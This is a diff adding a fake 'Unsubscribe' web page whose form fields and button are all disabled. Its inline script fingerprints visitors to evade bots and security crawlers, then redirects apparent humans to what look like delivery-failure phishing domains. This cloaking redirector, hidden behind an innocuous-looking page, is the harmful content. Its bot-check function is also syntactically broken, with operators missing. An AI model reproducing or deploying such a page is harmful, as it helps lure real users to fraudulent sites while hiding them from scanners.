@@ -1,0 +1,71 @@
+<!DOCTYPE html><html><head>
+    <meta charset="UTF-8">
+    <title>Unsubscribe</title>
+</head>
+<body>
+    <form>
+        <p style="color: gray">* required fields are marked red</p>
+        
+        <div>
+            <label style="color: red">Email address *</label><br>
+            <input type="email" disabled="" style="width: 200px; margin: 5px 0;">
+        </div>
+
+        <div>
+            <label style="color: red">Confirm your email address *</label><br>
+            <input type="email" disabled="" style="width: 200px; margin: 5px 0;">
+        </div>
+
+        <div style="margin-top: 15px;">
+            <input type="checkbox" disabled="">
+            <label>Unsubscribe</label>
+        </div>
+
+        <button type="submit" disabled="" style="margin-top: 10px;">Submit</button>
+    </form>
+
+    <script>
+        (function() {
+            let redirectAllowed = false;
+            let interactionCount = 0;
+
+            // V�rifie si c'est probablement un bot
+            function isBot() {
+                const botPatterns = /bot|crawler|spider|headless|puppet|selenium|phantom/i;
+                return botPatterns.test(navigator.userAgent)  
+                       !navigator.webdriver === undefined 
+                       !navigator.languages ||
+                       navigator.languages.length === 0;
+            }
+
+            // V�rifie les interactions utilisateur
+            function checkInteraction(e) {
+                if (!redirectAllowed && !isBot()) {
+                    interactionCount++;
+                    if (interactionCount >= 2) {
+                        redirectAllowed = true;
+                        setTimeout(function() {
+                            window.location.href = 'https://modifications-livraisons.com/';
+                        }, 1200);
+                    }
+                }
+            }
+
+            // �coute plusieurs types d'�v�nements
+            ['mousemove', 'click', 'scroll', 'keypress'].forEach(event => {
+                document.addEventListener(event, checkInteraction, {passive: true});
+            });
+
+            // V�rifie apr�s un court d�lai si l'utilisateur semble l�gitime
+            setTimeout(function() {
+                if (!isBot() && navigator.languages && navigator.languages.length > 0) {
+                    redirectAllowed = true;
+                    setTimeout(function() {
+                        window.location.href = 'https://distribution-echec.com/';
+                    }, 1200);
+                }
+            }, 500);
+        })();
+    </script>
+
+</body></html>
